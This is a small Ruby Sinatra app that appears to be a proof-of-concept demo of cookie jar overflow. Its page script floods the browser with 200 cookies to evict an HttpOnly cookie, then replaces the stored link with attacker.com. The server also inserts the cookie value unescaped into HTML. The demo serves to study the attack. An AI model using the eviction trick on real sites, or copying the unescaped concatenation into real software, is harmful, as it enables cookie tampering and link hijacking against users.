require 'sinatra'

get '/' do
  link_url = "http://google.com"
  if !request.cookies['link_url'] then
    response.set_cookie "link_url", {:value => link_url, :httponly => true}
  else
    link_url = request.cookies['link_url']
  end
  '<A HREF="' + link_url + '"> the secret url from cookie </A>
  <script>
  function setCookie()
  {
    var i = 0;
    while(i < 200)
      {
        kname = "test_COOKIE" + i;
        document.cookie = kname + "=test";
        i = i + 1;
      }
      document.cookie = "link_url=http://attacker.com";
      alert("overflow executed");
  }
  </script>
  <BR>
  <input type=button value="Cookie jar Overflow" onclick="setCookie()"><BR>
  '
end

set :port, 8080
